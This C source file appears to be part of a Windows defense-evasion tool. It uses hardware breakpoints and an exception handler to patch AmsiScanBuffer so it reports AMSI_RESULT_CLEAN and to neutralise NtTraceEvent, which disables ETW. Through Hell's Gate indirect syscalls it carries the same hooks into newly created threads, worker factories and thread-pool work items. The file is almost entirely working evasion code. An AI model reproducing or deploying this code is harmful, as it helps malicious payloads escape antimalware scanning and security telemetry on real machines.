#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>

#include "Prototypes.h"
#include "Structs.h"
#include "Macros.h"
#include "Ntdll.h"

void* g_ThreadPoolStartAddr = NULL;
void* g_ThreadPoolContext	= NULL;

void* g_WorkerFactoryStartRoutine	= NULL;
void* g_WorkerFactoryStartParameter = NULL;

BOOL SetHwbp(
	_In_	HANDLE	hThread,
	_In_	DWORD64	dwAddr1,
	_In_	DWORD64	dwAddr2,
	_In_	DWORD64	dwAddr3,
	_In_	DWORD64	dwAddr4
)
{
	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_ALL;

	if (!GetThreadContext(hThread, &ctx))
		return FALSE;

	// Breakpoint addr
	ctx.Dr0 = dwAddr1;
	ctx.Dr1 = dwAddr2;
	ctx.Dr2 = dwAddr3;
	ctx.Dr3 = dwAddr4;

	// Enable bp
	ctx.Dr7 |= (1 << 0);
	ctx.Dr7 |= (1 << 2);
	ctx.Dr7 |= (1 << 4);
	ctx.Dr7 |= (1 << 6);

	// Trigger on exec
	ctx.Dr7 &= ~(3 << 16);
	ctx.Dr7 &= ~(3 << 20);
	ctx.Dr7 &= ~(3 << 24);
	ctx.Dr7 &= ~(3 << 28);

	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

	if (!SetThreadContext(hThread, &ctx))
		return FALSE;

	return TRUE;
}

VOID	hookWorkerFactory()
{
	//printf("[!] Thread created with factory ! TID : %d\n", GetCurrentThreadId());

	HANDLE hThread = GetCurrentThread();
	HOOK_ADDR hookAddr = { 0 };

	if (!SolveHookAddr(&hookAddr))
		goto jmp_exec;

	if (!SetHwbp(hThread, hookAddr.NtCreateThreadEx, hookAddr.NtCreateWorkerFactory, hookAddr.NtTraceEvent, hookAddr.QueueUserWorkItem))
		goto jmp_exec;

jmp_exec:
	((fnExec)g_WorkerFactoryStartRoutine)(g_WorkerFactoryStartParameter);
}

VOID	hookQueueUserWorkItem()
{
	//printf("[!] Thread created with worker ! TID : %d\n", GetCurrentThreadId());

	HANDLE hThread = GetCurrentThread();
	HOOK_ADDR hookAddr = { 0 };

	if (!SolveHookAddr(&hookAddr))
		goto jmp_exec;

	if (!SetHwbp(hThread, hookAddr.NtCreateThreadEx, hookAddr.NtCreateWorkerFactory, hookAddr.NtTraceEvent, hookAddr.QueueUserWorkItem))
		goto jmp_exec;

jmp_exec:
	((fnExec)g_ThreadPoolStartAddr)(g_ThreadPoolContext);
}

LONG HookHandler(
	_In_	PEXCEPTION_POINTERS		ExceptionInfo
)
{
	if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP)
	{
		HMODULE hModAmsi =	LoadLibraryA("amsi.dll");
		HMODULE hModNtdll = LoadLibraryA("Ntdll.dll");

		if (!hModAmsi || !hModNtdll)
		{
			return EXCEPTION_CONTINUE_SEARCH;
		}


		DWORD64	dwAmsiScanBuffer			= GetProcAddress(hModAmsi,		"AmsiScanBuffer");
		DWORD64 dwNtTraceEvent				= GetProcAddress(hModNtdll,		"NtTraceEvent");
		DWORD64 dwNtCreateThreadEx			= GetProcAddress(hModNtdll,		"NtCreateThreadEx");
		DWORD64 dwNtCreateWorkerFactory		= GetProcAddress(hModNtdll,		"NtCreateWorkerFactory");
		DWORD64 dwQueueUserWorkItem			= GetProcAddress(hModNtdll,		"RtlQueueWorkItem");

		if (
			!dwAmsiScanBuffer ||
			!dwNtTraceEvent ||
			!dwNtCreateThreadEx ||
			!dwNtCreateWorkerFactory ||
			!dwQueueUserWorkItem
			)
		{
			return EXCEPTION_CONTINUE_SEARCH;
		}


		DWORD64 dwRipValue = ExceptionInfo->ContextRecord->Rip;


		if (dwRipValue == dwAmsiScanBuffer)	// Redirect rip to ret; rax (return value) take AMSI_RESULT_CLEAN
		{
			//printf("[*] AmsiScanBuffer hook !\n");
			ExceptionInfo->ContextRecord->Rax = AMSI_RESULT_CLEAN;
			ExceptionInfo->ContextRecord->Rip = dwFindRetInstruction(dwRipValue);
			return EXCEPTION_CONTINUE_EXECUTION;
		}
		else if (dwRipValue == dwNtTraceEvent)
		{
			//printf("[*] NtTraceEvent hook !\n");
			ExceptionInfo->ContextRecord->Rax = STATUS_SUCCESS;
			ExceptionInfo->ContextRecord->Rip = dwFindRetInstruction(dwRipValue); // Redirect rip to ret; rax (return value) take 0 for STATUS_SUCCESS

			return EXCEPTION_CONTINUE_EXECUTION;
		}
		else if (dwRipValue == dwNtCreateThreadEx)	// Execute NtCreateThreadEx over Indirect Syscall to obtain the handle of created process, put hook in the new process. Change the PHANDLE value in Rcx with our handle and rax take 0 for STATUS_SUCCESS
		{
			//printf("[*] NtCreateThreadEx hook !\n");

			void* arg1	= ExceptionInfo->ContextRecord->Rcx; // _Out_ PHANDLE ThreadHandle
			void* arg2	= ExceptionInfo->ContextRecord->Rdx; // DesiredAccess
			void* arg3	= ExceptionInfo->ContextRecord->R8;	// ObjectAttributes
			void* arg4	= ExceptionInfo->ContextRecord->R9;	// Process Handle

			void* arg5	= DEREF(ExceptionInfo->ContextRecord->Rsp + 0x28);  // StartRoutine
			void* arg6	= DEREF(ExceptionInfo->ContextRecord->Rsp + 0x30);  // Argument
			void* arg7	= DEREF(ExceptionInfo->ContextRecord->Rsp + 0x38);  // CreateFlags
			void* arg8	= DEREF(ExceptionInfo->ContextRecord->Rsp + 0x40);  // ZeroBits
			void* arg9	= DEREF(ExceptionInfo->ContextRecord->Rsp + 0x48);  // StackSize
			void* arg10 = DEREF(ExceptionInfo->ContextRecord->Rsp + 0x50); // MaxStackSize
			void* arg11 = DEREF(ExceptionInfo->ContextRecord->Rsp + 0x58); // AttributeList

			SYS_INFO sysInfo = { 0 };
			HANDLE hThread = NULL;
			NTSTATUS status = 0;

			if(!GetSyscall(dwNtCreateThreadEx, &sysInfo))
				return EXCEPTION_CONTINUE_SEARCH;

			//printf("[!] Function addr : %p\n[!] SSN : %d\n[!] Jmp addr : 0x%p\n", dwNtCreateThreadEx, sysInfo.syscall, sysInfo.pAddress);

			HellsGate(sysInfo.syscall, sysInfo.pAddress);
			status = HellDescent(&hThread, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10, arg11);

			//printf("[*] NTSTATUS for NtCreateThreadEx : 0x%llx\n", status);
			//printf("New thread ID: %d\n", GetThreadId(hThread));
			if (!
				SetHwbp(hThread, dwNtCreateWorkerFactory, dwNtCreateThreadEx, dwQueueUserWorkItem, dwNtTraceEvent)
				)
			{
				printf("[!] Error to put HWBP in new thread !\n");
				return EXCEPTION_CONTINUE_SEARCH;
			}
			//printf("[!] HWBP put with success !\n");
			ExceptionInfo->ContextRecord->Rax = status;
			DEREF(ExceptionInfo->ContextRecord->Rcx) = U_PTR(hThread);
			ExceptionInfo->ContextRecord->Rip = dwFindRetInstruction(dwRipValue);

			return EXCEPTION_CONTINUE_EXECUTION;
		}
		else if (dwRipValue == dwNtCreateWorkerFactory)
		{
			//printf("[*] NtCreateWorkerFactory hook !\n");

			void* arg6 = DEREF(ExceptionInfo->ContextRecord->Rsp + 0x30);  // StartRoutine
			void* arg7 = DEREF(ExceptionInfo->ContextRecord->Rsp + 0x38);  // StartParameter

			g_WorkerFactoryStartRoutine		= arg6;
			g_WorkerFactoryStartParameter	= arg7;

			//printf("[*] Redirect StartRoutine of worker factory : 0x%p to 0x%p\n[*] Factory args addr : 0x%p\n", arg6, &hookWorkerFactory, arg7);

			DEREF(ExceptionInfo->ContextRecord->Rsp + 0x30) = U_PTR(&hookWorkerFactory);
			ExceptionInfo->ContextRecord->EFlags |= (1 << 16); // continue exec

			return EXCEPTION_CONTINUE_EXECUTION;
		}
		else if (dwRipValue == dwQueueUserWorkItem)
		{
			//printf("[*] QueueUserWorkItem hook !\n");
			void* arg1 = ExceptionInfo->ContextRecord->Rcx; // StartRoutineAddr
			void* arg2 = ExceptionInfo->ContextRecord->Rdx; // Context 

			g_ThreadPoolStartAddr = arg1;
			g_ThreadPoolContext = arg2;

			ExceptionInfo->ContextRecord->Rcx = U_PTR(&hookQueueUserWorkItem);
			ExceptionInfo->ContextRecord->EFlags |= (1 << 16); // continue exec
	
			return EXCEPTION_CONTINUE_EXECUTION;
		}
		else
		{
			return EXCEPTION_CONTINUE_SEARCH;
		}

	}

	return EXCEPTION_CONTINUE_SEARCH;


}
